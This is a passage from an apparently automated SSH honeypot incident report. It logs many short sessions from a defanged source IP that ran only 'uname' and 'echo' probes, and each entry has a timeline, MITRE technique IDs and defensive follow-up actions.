| `2026-08-15 20:25:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1490f685c546

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:25 |
| **Last Seen** | 2026-08-15 20:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:25:27` | `cowrie.session.connect` |
| `2026-08-15 20:25:27` | `cowrie.client.version` |
| `2026-08-15 20:25:27` | `cowrie.client.kex` |
| `2026-08-15 20:25:27` | `cowrie.login.success` |
| `2026-08-15 20:25:28` | `cowrie.session.params` |
| `2026-08-15 20:25:28` | `cowrie.command.input` |
| `2026-08-15 20:25:28` | `cowrie.log.closed` |
| `2026-08-15 20:25:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbd0f3c41cb0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:25 |
| **Last Seen** | 2026-08-15 20:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:25:32` | `cowrie.session.connect` |
| `2026-08-15 20:25:32` | `cowrie.client.version` |
| `2026-08-15 20:25:32` | `cowrie.client.kex` |
| `2026-08-15 20:25:32` | `cowrie.login.success` |
| `2026-08-15 20:25:33` | `cowrie.session.params` |
| `2026-08-15 20:25:33` | `cowrie.command.input` |
| `2026-08-15 20:25:34` | `cowrie.log.closed` |
| `2026-08-15 20:25:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44460389cbd3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:25 |
| **Last Seen** | 2026-08-15 20:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:25:37` | `cowrie.session.connect` |
| `2026-08-15 20:25:37` | `cowrie.client.version` |
| `2026-08-15 20:25:37` | `cowrie.client.kex` |
| `2026-08-15 20:25:38` | `cowrie.login.success` |
| `2026-08-15 20:25:39` | `cowrie.session.params` |
| `2026-08-15 20:25:39` | `cowrie.command.input` |
| `2026-08-15 20:25:39` | `cowrie.log.closed` |
| `2026-08-15 20:25:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93d02fdde72d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:25 |
| **Last Seen** | 2026-08-15 20:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:25:42` | `cowrie.session.connect` |
| `2026-08-15 20:25:43` | `cowrie.client.version` |
| `2026-08-15 20:25:43` | `cowrie.client.kex` |
| `2026-08-15 20:25:43` | `cowrie.login.success` |
| `2026-08-15 20:25:44` | `cowrie.session.params` |
| `2026-08-15 20:25:44` | `cowrie.command.input` |
| `2026-08-15 20:25:44` | `cowrie.log.closed` |
| `2026-08-15 20:25:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-237d2d9c0031

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:25 |
| **Last Seen** | 2026-08-15 20:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:25:48` | `cowrie.session.connect` |
| `2026-08-15 20:25:48` | `cowrie.client.version` |
| `2026-08-15 20:25:48` | `cowrie.client.kex` |
| `2026-08-15 20:25:49` | `cowrie.login.success` |
| `2026-08-15 20:25:50` | `cowrie.session.params` |
| `2026-08-15 20:25:50` | `cowrie.command.input` |
| `2026-08-15 20:25:50` | `cowrie.log.closed` |
| `2026-08-15 20:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b972ac95bbe2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:25 |
| **Last Seen** | 2026-08-15 20:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:25:53` | `cowrie.session.connect` |
| `2026-08-15 20:25:53` | `cowrie.client.version` |
| `2026-08-15 20:25:53` | `cowrie.client.kex` |
| `2026-08-15 20:25:53` | `cowrie.login.success` |
| `2026-08-15 20:25:54` | `cowrie.session.params` |
| `2026-08-15 20:25:54` | `cowrie.command.input` |
| `2026-08-15 20:25:55` | `cowrie.log.closed` |
| `2026-08-15 20:25:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cf6112e92b1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:25 |
| **Last Seen** | 2026-08-15 20:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:25:58` | `cowrie.session.connect` |
| `2026-08-15 20:25:58` | `cowrie.client.version` |
| `2026-08-15 20:25:58` | `cowrie.client.kex` |
| `2026-08-15 20:25:59` | `cowrie.login.success` |
| `2026-08-15 20:26:00` | `cowrie.session.params` |
| `2026-08-15 20:26:00` | `cowrie.command.input` |
| `2026-08-15 20:26:00` | `cowrie.log.closed` |
| `2026-08-15 20:26:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87a29bddd30b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:26 |
| **Last Seen** | 2026-08-15 20:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:26:03` | `cowrie.session.connect` |
| `2026-08-15 20:26:03` | `cowrie.client.version` |
| `2026-08-15 20:26:03` | `cowrie.client.kex` |
| `2026-08-15 20:26:04` | `cowrie.login.success` |
| `2026-08-15 20:26:04` | `cowrie.session.params` |
| `2026-08-15 20:26:04` | `cowrie.command.input` |
| `2026-08-15 20:26:05` | `cowrie.log.closed` |
| `2026-08-15 20:26:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26eae48b6b82

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:26 |
| **Last Seen** | 2026-08-15 20:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:26:08` | `cowrie.session.connect` |
| `2026-08-15 20:26:08` | `cowrie.client.version` |
| `2026-08-15 20:26:08` | `cowrie.client.kex` |
| `2026-08-15 20:26:09` | `cowrie.login.success` |
| `2026-08-15 20:26:10` | `cowrie.session.params` |
| `2026-08-15 20:26:10` | `cowrie.command.input` |
| `2026-08-15 20:26:10` | `cowrie.log.closed` |
| `2026-08-15 20:26:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8026cb27974b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:26 |
| **Last Seen** | 2026-08-15 20:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:26:14` | `cowrie.session.connect` |
| `2026-08-15 20:26:14` | `cowrie.client.version` |
| `2026-08-15 20:26:14` | `cowrie.client.kex` |
| `2026-08-15 20:26:14` | `cowrie.login.success` |
| `2026-08-15 20:26:15` | `cowrie.session.params` |
| `2026-08-15 20:26:15` | `cowrie.command.input` |
| `2026-08-15 20:26:15` | `cowrie.log.closed` |
| `2026-08-15 20:26:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ec52c9588c5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:26 |
| **Last Seen** | 2026-08-15 20:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:26:19` | `cowrie.session.connect` |
| `2026-08-15 20:26:19` | `cowrie.client.version` |
| `2026-08-15 20:26:19` | `cowrie.client.kex` |
| `2026-08-15 20:26:20` | `cowrie.login.success` |
| `2026-08-15 20:26:21` | `cowrie.session.params` |
| `2026-08-15 20:26:21` | `cowrie.command.input` |
| `2026-08-15 20:26:21` | `cowrie.log.closed` |
| `2026-08-15 20:26:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96826640d194

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:26 |
| **Last Seen** | 2026-08-15 20:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:26:24` | `cowrie.session.connect` |
| `2026-08-15 20:26:24` | `cowrie.client.version` |
| `2026-08-15 20:26:24` | `cowrie.client.kex` |
| `2026-08-15 20:26:25` | `cowrie.login.success` |
| `2026-08-15 20:26:26` | `cowrie.session.params` |
| `2026-08-15 20:26:26` | `cowrie.command.input` |
| `2026-08-15 20:26:26` | `cowrie.log.closed` |
| `2026-08-15 20:26:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa928e48ddd5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:26 |
| **Last Seen** | 2026-08-15 20:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:26:29` | `cowrie.session.connect` |
| `2026-08-15 20:26:29` | `cowrie.client.version` |
| `2026-08-15 20:26:30` | `cowrie.client.kex` |
| `2026-08-15 20:26:31` | `cowrie.login.success` |
| `2026-08-15 20:26:32` | `cowrie.session.params` |
| `2026-08-15 20:26:32` | `cowrie.command.input` |
| `2026-08-15 20:26:32` | `cowrie.log.closed` |
| `2026-08-15 20:26:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acc5bbdec28a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:26 |
| **Last Seen** | 2026-08-15 20:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:26:35` | `cowrie.session.connect` |
| `2026-08-15 20:26:35` | `cowrie.client.version` |
| `2026-08-15 20:26:35` | `cowrie.client.kex` |
| `2026-08-15 20:26:35` | `cowrie.login.success` |
| `2026-08-15 20:26:36` | `cowrie.session.params` |
| `2026-08-15 20:26:36` | `cowrie.command.input` |
| `2026-08-15 20:26:37` | `cowrie.log.closed` |
| `2026-08-15 20:26:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6536c5f7433f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:26 |
| **Last Seen** | 2026-08-15 20:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:26:40` | `cowrie.session.connect` |
| `2026-08-15 20:26:40` | `cowrie.client.version` |
| `2026-08-15 20:26:40` | `cowrie.client.kex` |
| `2026-08-15 20:26:40` | `cowrie.login.success` |
| `2026-08-15 20:26:41` | `cowrie.session.params` |
| `2026-08-15 20:26:41` | `cowrie.command.input` |
| `2026-08-15 20:26:41` | `cowrie.log.closed` |
| `2026-08-15 20:26:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6d6d45f3b23

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:26 |
| **Last Seen** | 2026-08-15 20:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:26:45` | `cowrie.session.connect` |
| `2026-08-15 20:26:45` | `cowrie.client.version` |
| `2026-08-15 20:26:45` | `cowrie.client.kex` |
| `2026-08-15 20:26:46` | `cowrie.login.success` |
| `2026-08-15 20:26:47` | `cowrie.session.params` |
| `2026-08-15 20:26:47` | `cowrie.command.input` |
| `2026-08-15 20:26:47` | `cowrie.log.closed` |
| `2026-08-15 20:26:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f959673b3d3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:26 |
| **Last Seen** | 2026-08-15 20:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:26:50` | `cowrie.session.connect` |
| `2026-08-15 20:26:50` | `cowrie.client.version` |
| `2026-08-15 20:26:50` | `cowrie.client.kex` |
| `2026-08-15 20:26:51` | `cowrie.login.success` |
| `2026-08-15 20:26:52` | `cowrie.session.params` |
| `2026-08-15 20:26:52` | `cowrie.command.input` |
| `2026-08-15 20:26:52` | `cowrie.log.closed` |
| `2026-08-15 20:26:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cda4762f075

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:26 |
| **Last Seen** | 2026-08-15 20:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:26:55` | `cowrie.session.connect` |
| `2026-08-15 20:26:55` | `cowrie.client.version` |
| `2026-08-15 20:26:56` | `cowrie.client.kex` |
| `2026-08-15 20:26:56` | `cowrie.login.success` |
| `2026-08-15 20:26:57` | `cowrie.session.params` |
| `2026-08-15 20:26:57` | `cowrie.command.input` |
| `2026-08-15 20:26:57` | `cowrie.log.closed` |
| `2026-08-15 20:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-223836d3a511

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:27 |
| **Last Seen** | 2026-08-15 20:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:27:01` | `cowrie.session.connect` |
| `2026-08-15 20:27:01` | `cowrie.client.version` |
| `2026-08-15 20:27:01` | `cowrie.client.kex` |
| `2026-08-15 20:27:01` | `cowrie.login.success` |
| `2026-08-15 20:27:02` | `cowrie.session.params` |
| `2026-08-15 20:27:02` | `cowrie.command.input` |
| `2026-08-15 20:27:02` | `cowrie.log.closed` |
| `2026-08-15 20:27:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b10f2483c8cb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:27 |
| **Last Seen** | 2026-08-15 20:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:27:06` | `cowrie.session.connect` |
| `2026-08-15 20:27:06` | `cowrie.client.version` |
| `2026-08-15 20:27:06` | `cowrie.client.kex` |
| `2026-08-15 20:27:07` | `cowrie.login.success` |
| `2026-08-15 20:27:08` | `cowrie.session.params` |
| `2026-08-15 20:27:08` | `cowrie.command.input` |
| `2026-08-15 20:27:08` | `cowrie.log.closed` |
| `2026-08-15 20:27:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e8deb888969

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:27 |
| **Last Seen** | 2026-08-15 20:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:27:11` | `cowrie.session.connect` |
| `2026-08-15 20:27:11` | `cowrie.client.version` |
| `2026-08-15 20:27:11` | `cowrie.client.kex` |
| `2026-08-15 20:27:12` | `cowrie.login.success` |
| `2026-08-15 20:27:13` | `cowrie.session.params` |
| `2026-08-15 20:27:13` | `cowrie.command.input` |
| `2026-08-15 20:27:13` | `cowrie.log.closed` |
| `2026-08-15 20:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2dcf307559f

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-15 20:27 |
| **Last Seen** | 2026-08-15 20:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:27:14` | `cowrie.session.connect` |
| `2026-08-15 20:27:14` | `cowrie.client.version` |
| `2026-08-15 20:27:14` | `cowrie.client.kex` |
| `2026-08-15 20:27:14` | `cowrie.login.success` |
| `2026-08-15 20:27:15` | `cowrie.session.params` |
| `2026-08-15 20:27:15` | `cowrie.command.input` |
| `2026-08-15 20:27:15` | `cowrie.log.closed` |
| `2026-08-15 20:27:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78a1af94abf4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:27 |
| **Last Seen** | 2026-08-15 20:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:27:16` | `cowrie.session.connect` |
| `2026-08-15 20:27:16` | `cowrie.client.version` |
| `2026-08-15 20:27:16` | `cowrie.client.kex` |
| `2026-08-15 20:27:17` | `cowrie.login.success` |
| `2026-08-15 20:27:17` | `cowrie.session.params` |
| `2026-08-15 20:27:17` | `cowrie.command.input` |
| `2026-08-15 20:27:18` | `cowrie.log.closed` |
| `2026-08-15 20:27:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e51e7d2bc345

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:27 |
| **Last Seen** | 2026-08-15 20:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:27:21` | `cowrie.session.connect` |
| `2026-08-15 20:27:21` | `cowrie.client.version` |
| `2026-08-15 20:27:21` | `cowrie.client.kex` |
| `2026-08-15 20:27:22` | `cowrie.login.success` |
| `2026-08-15 20:27:22` | `cowrie.session.params` |
| `2026-08-15 20:27:22` | `cowrie.command.input` |
| `2026-08-15 20:27:23` | `cowrie.log.closed` |
| `2026-08-15 20:27:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e3c01f12ab7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:27 |
| **Last Seen** | 2026-08-15 20:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:27:26` | `cowrie.session.connect` |
| `2026-08-15 20:27:27` | `cowrie.client.version` |
| `2026-08-15 20:27:27` | `cowrie.client.kex` |
| `2026-08-15 20:27:27` | `cowrie.login.success` |
| `2026-08-15 20:27:28` | `cowrie.session.params` |
| `2026-08-15 20:27:28` | `cowrie.command.input` |
| `2026-08-15 20:27:28` | `cowrie.log.closed` |
| `2026-08-15 20:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d0153ab96f0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:27 |
| **Last Seen** | 2026-08-15 20:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
